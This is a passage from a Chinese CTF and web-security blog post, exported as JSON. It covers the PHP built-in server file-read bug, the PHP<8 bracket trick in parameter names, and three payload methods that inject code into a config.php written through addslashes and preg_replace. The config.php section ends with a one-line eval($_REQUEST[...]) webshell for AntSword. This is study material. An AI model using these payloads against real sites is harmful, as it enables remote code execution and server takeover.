stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>原理有点绕，可以看看<code>7.4.21</code>和<code>7.4.22</code>的区别分析一下</p></blockquote>\n<h2 id=\"7-4-21\"><a href=\"#7-4-21\" class=\"headerlink\" title=\"7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现\"></a>7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现</h2><p>当然并不是高版本就不行了，，其实高版本也存在这个漏洞</p>\n<p>在低于<code>8.0.2</code>版本的<code>php</code>，如果想要复现这个漏洞需要满足一个条件，就是命令执行所在的目录下必须没有<code>index.php</code>文件才可以实现</p>\n<h3 id=\"低版本有index-php情况\"><a href=\"#低版本有index-php情况\" class=\"headerlink\" title=\"低版本有index.php情况\"></a>低版本有<code>index.php</code>情况</h3><p>我们先在<code>7.0.33</code>版本下生成一个<code>index.php</code>文件，</p>\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"keyword\">echo</span> <span class=\"string\">\"welcome index!\"</span>;\n<span class=\"meta\">?></span></code></pre>\n\n<p><img src=\"/post/Note/image-20230904180249243.png\" alt=\"image-20230904180249243\"></p>\n<p>发现在低版本下如果在目录执行的目录下有<code>index.php</code>，也无法进行任意文件内容的读取</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>想要实现php内置服务器任意文件读取，首先是要满足版本要求，其次需要满足，对方执行搭建内置服务器的目录下没有index.php文件，才可以实现任意文件内容的一个读取，不过一般的开发者都不会把php内置服务器搭建的网站挂在公网上，不过这个漏洞也是一个值得考虑的一个利用点</p></blockquote>\n<h1 id=\"php-8非法参数名传参\"><a href=\"#php-8非法参数名传参\" class=\"headerlink\" title=\"php &lt; 8非法参数名传参\"></a>php &lt; 8非法参数名传参</h1><p>当传参<code>$_REQUEST[&#39;mo chu.&#39;]</code></p>\n<p>参数名中含有<code>空格</code>和<code>点</code>，可以看到当我们传入<code>?mo chu. =xxx</code>时，传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code>，这样的参数名确实无法传参。</p>\n<p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code>。</p>\n<p>Payload如下：</p>\n<pre class=\" language-highlight php\">?mo[chu.<span class=\"number\"><code class=\"language-highlight php\">?mo[chu.<span class=\"number\">7</span>=xxx</code></pre>\n\n<p>利用了如果传入的参数名出现了中括号<code>[</code>只替换一次的原理，使得传入的参数为：<code>mo_chu.7</code></p>\n<p>但是如果出现了多个 <code>[</code>，就无法替换了</p>\n<p>在PHP8中这种转换错误被修复了，传入的参数名中非法字符一律全部转换为了下划线</p>\n<h1 id=\"PHP写入配置文件的经典漏洞\"><a href=\"#PHP写入配置文件的经典漏洞\" class=\"headerlink\" title=\"PHP写入配置文件的经典漏洞\"></a>PHP写入配置文件的经典漏洞</h1><p>在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含</p>\n<p><a href=\"https://bbs.zkaq.cn/t/6045.html\">转载文章</a></p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">`<?php`\n`if(!isset($_GET[&#x27;option&#x27;])) die();\n$str = addslashes($_GET[&#x27;option&#x27;]);`\n`$file = file_get_contents(&#x27;./config.php&#x27;);`\n`$file = preg_replace(&#x27;|\\$option=\\&#x27;.*\\&#x27;;|&#x27;, \"\\$option=&#x27;$str&#x27;;\", $file);`\n`file_put_contents(&#x27;./config.php&#x27;, $file);</code></pre>\n\n\n<p><code>config.php</code> 的内容如下:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\"><?php\n$option=&#x27;test&#x27;;</code></pre>\n\n<p>要求是要<code>getshell</code>,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是<code>”双引号”</code>引起任意代码执行的问题,这这里面用的是单引号,而且 <code>addslashes()</code>处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>\n<h2 id=\"方法一-利用换行符来绕过正则匹配的问题\"><a href=\"#方法一-利用换行符来绕过正则匹配的问题\" class=\"headerlink\" title=\"方法一,利用换行符来绕过正则匹配的问题\"></a>方法一,利用换行符来绕过正则匹配的问题</h2><p>可以看到正则匹配的是以下内容:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">$option=&#x27;任意内容&#x27;</code></pre>\n\n\n<p>任意内容里面是可以包含转移符 <code>\\</code> 的,所以我们利用下面的方法:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">http://127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//\nhttp://127.0.0.1/index.php?option=a</code></pre>\n\n\n<p>执行完第一个之后,<code>config.php</code>中的内容为:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\"><?php\n$option=&#x27;a\\&#x27;;\nphpinfo();//&#x27;;</code></pre>\n\n<p>但是这样并没有办法执行<code>phpinfo()</code>,因为我们插入的 单引号 被转移掉了,所以<code>phpinfo()</code>还是在单引号的包裹之内.<br>我们在访问下面这个</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">http://127.0.0.1/index.php?option=a</code></pre>\n\n\n<p>因为正则 <code>.*</code> 会匹配行内的任意字符无数次.所以 <code>\\</code> 也被认为是其中的一部分,也会被替换掉,执行完之后,<code>config.php</code>中的内容为:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\"><?php\n$option=&#x27;a&#x27;;\nphpinfo();//&#x27;;</code></pre>\n\n\n<p>转义符就被替换掉了,就成功的<code>getshell</code>.</p>\n<h2 id=\"方法二-利用-preg-replace函数的问题\"><a href=\"#方法二-利用-preg-replace函数的问题\" class=\"headerlink\" title=\"方法二,利用 preg_replace函数的问题:\"></a>方法二,利用 preg_replace函数的问题:</h2><p>用<code>preg_replace()</code>的时候<code>replacement(第二个参数)</code>也要经过正则引擎处理，所以正则引擎把<code>\\\\</code>转义成了<code>\\</code><br>也就是说如果字符串是<code>\\\\\\&amp;#39;</code>,经过 <code>preg_replace()</code>的处理,就变为 <code>#39;</code>,单引号就逃出来了.<br>所以<code>payload</code>如下:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">http://127.0.0.1/index.php?option=a\\&#x27;;phpinfo();//</code></pre>\n\n\n<p><code>config.php</code>变为:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\"><?php\n$option=&#x27;a\\\\&#x27;;phpinfo();//&#x27;;</code></pre>\n\n<p>**道理就是  <code>a\\&amp;#39;;phpinfo();//</code>  经过 <code>addslashes()</code>处理之后,变为<code>a\\\\\\&amp;#39;;phpinfo();//</code> 然后两个反斜杠被<code>preg_replace</code>变成了一个,导致单引号逃脱.</p>\n<h2 id=\"方法三-利用-preg-replace-函数的第二个参数的问题\"><a href=\"#方法三-利用-preg-replace-函数的第二个参数的问题\" class=\"headerlink\" title=\"方法三, 利用 preg_replace() 函数的第二个参数的问题\"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h2><p>先看官方对<code>preg_replace()</code>函数的描述<code>manual</code><br>函数原型:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">xed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )</code></pre>\n\n\n<p>对<code>replacement</code>的描述.<br><code>replacement</code>中可以包含后</p>\n<p>向<code>引用\\\\n或(php 4.0.4以上可用)$n</code>，语法上首选后者。 每个 这样的引用将被匹配到的第<code>n</code>个捕获子组捕获到的文本替换。 <code>n</code> 可以是<code>0-99</code>，<code>\\\\0</code>和<code>$0</code>代表完整的模式匹配文本。</p>\n<p>所以我们可以用:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">http://127.0.0.1/test/ph.php?option=;phpinfo();\nhttp://127.0.0.1/test/ph.php?option= 或者 http://127.0.0.1/test/ph.php?option=$0</code></pre>\n\n\n<p>执行第一条后<code>config.php</code>的内容为:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\"><?php\n$option=&#x27;;phpinfo();&#x27;;</code></pre>\n\n\n<p>再执行第二条后<code>config.php</code>的内容为:</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\"><?php\n$option=&#x27;$option=&#x27;;phpinfo();&#x27;;&#x27;;</code></pre>\n\n\n<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>\n<hr>\n<p>要<code>getshell</code>直接</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">把phpinfo()替换成\neval($_REQUEST[123])\nassert($_REQUEST[123])\n蚁剑连接即可</code></pre>\n\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1>","text":"关键笔记，主要总结比赛中遇到的 pearcmd.php的巧妙利用 来自P神博客 https://www.leavesongs.com/PENETRATION/d...","permalink":"/post/Notes","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"19 mins."},"categories":[{"name":"web","slug":"web","count":2,"path":"api/categories/web.json"}],"tags":[{"name":"daily","slug":"daily","count":2,"path":"api/tags/daily.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pearcmd-php%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">pearcmd.php的巧妙利用</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#libmbfl%E6%89%93%E5%88%86\"><span class=\"toc-text\">libmbfl打分</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Tomcat%E4%BB%A5-%E4%B8%80%E7%A7%8D%E5%A5%87%E6%80%AA%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E8%A7%84%E8%8C%83%E5%8C%96\"><span class=\"toc-text\">Tomcat以;一种奇怪的方式进行规范化</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AFXSS%E3%80%90%E9%92%88%E5%AF%B9%E4%BA%8E%E5%8A%A8%E6%80%81PDF%E3%80%91\"><span class=\"toc-text\">服务器端XSS【针对于动态PDF】</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%BE%97%E7%A8%B3%E5%AE%9A%E7%9A%84shell\"><span class=\"toc-text\">获得稳定的shell</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#T3%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">T3协议的反序列化攻击</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%85%AC%E7%BD%91%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">记第一次公网测试</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#file-b%E8%A7%A3%E6%9E%90-%E5%90%8E%E5%86%85%E5%AE%B9%E6%98%BE%E7%A4%BA\"><span class=\"toc-text\">file -b解析#!后内容显示</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#strace%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">strace命令</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6\"><span class=\"toc-text\">Mysql主从复制</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%94%BB%E5%87%BB%E6%9C%BA%E3%80%90%E4%B8%BB%E3%80%91\"><span class=\"toc-text\">攻击机【主】</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%89%A7%E8%A1%8C%E3%80%90%E4%BB%8E%E3%80%91\"><span class=\"toc-text\">环境执行【从】</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#windows%E4%B8%8Elinux%E5%AF%B9-%E7%9A%84%E4%B8%8D%E5%90%8C%E8%A7%A3%E6%9E%90%E4%B8%8E%E9%99%90%E5%88%B6\"><span class=\"toc-text\">windows与linux对;的不同解析与限制</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Flask%E7%9A%84Debug%E6%A8%A1%E5%BC%8F\"><span class=\"toc-text\">Flask的Debug模式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8debug%E5%8A%9F%E8%83%BD%E8%83%BD%E5%B9%B2%E5%95%A5\"><span class=\"toc-text\">利用debug功能能干啥</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PIN-%E7%A0%81%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90\"><span class=\"toc-text\">PIN 码如何生成</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95\"><span class=\"toc-text\">生成算法</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8\"><span class=\"toc-text\">反序列化逃逸</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#session%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">session进行文件包含</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#session-upload-progress%E4%BD%9C%E7%94%A8%EF%BC%9F\"><span class=\"toc-text\">session.upload_progress作用？</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">hash长度扩展攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MD5%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">MD5加密原理</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#php\"><span class=\"toc-text\">php&lt;&#x3D;7.4.21 内置服务器任意文件读取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-4-21\"><span class=\"toc-text\">7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%8E%E7%89%88%E6%9C%AC%E6%9C%89index-php%E6%83%85%E5%86%B5\"><span class=\"toc-text\">低版本有index.php情况</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#php-8%E9%9D%9E%E6%B3%95%E5%8F%82%E6%95%B0%E5%90%8D%E4%BC%A0%E5%8F%82\"><span class=\"toc-text\">php &lt; 8非法参数名传参</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#PHP%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">PHP写入配置文件的经典漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%88%A9%E7%94%A8%E6%8D%A2%E8%A1%8C%E7%AC%A6%E6%9D%A5%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">方法一,利用换行符来绕过正则匹配的问题</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%88%A9%E7%94%A8-preg-replace%E5%87%BD%E6%95%B0%E7%9A%84%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">方法二,利用 preg_replace函数的问题:</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%89-%E5%88%A9%E7%94%A8-preg-replace-%E5%87%BD%E6%95%B0%E7%9A%84%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%E7%9A%84%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">方法三, 利用 preg_replace() 函数的第二个参数的问题</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"hxp2022 wp","uid":"797ca882649370ce9de496b0772408c1","slug":"2022hxp","date":"2023-03-10T07:03:20.894Z","updated":"2023-08-06T08:01:43.403Z","comments":true,"path":"api/articles/2022hxp.json","keywords":null,"cover":"/img/38.jpg","text":"在ctftime看到的，题目有深度的 Disclaimer This challenge offers an individual instance for y...","permalink":"/post/2022hxp","photos":[],"count_time":{"symbolsCount":"6.7k","symbolsTime":"6 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"工具项目编写","uid":"a008a70087e40ad6885d0ce08a94aee5","slug":"tools-making","date":"2023-02-15T04:11:15.439Z","updated":"2023-09-06T12:30:14.700Z","comments":true,"path":"api/articles/tools-making.json","keywords":null,"cover":"/img/25.jpg","text":"主要通过写项目练习一下自己的go语言水平 wfuzzhttps://github.com/try-to-change/wfuzz-ttoc 定义命令行参数，使用...","permalink":"/post/tools-making","photos":[],"count_time":{"symbolsCount":744,"symbolsTime":"1 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"go语言","slug":"go语言","count":2,"path":"api/tags/go语言.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}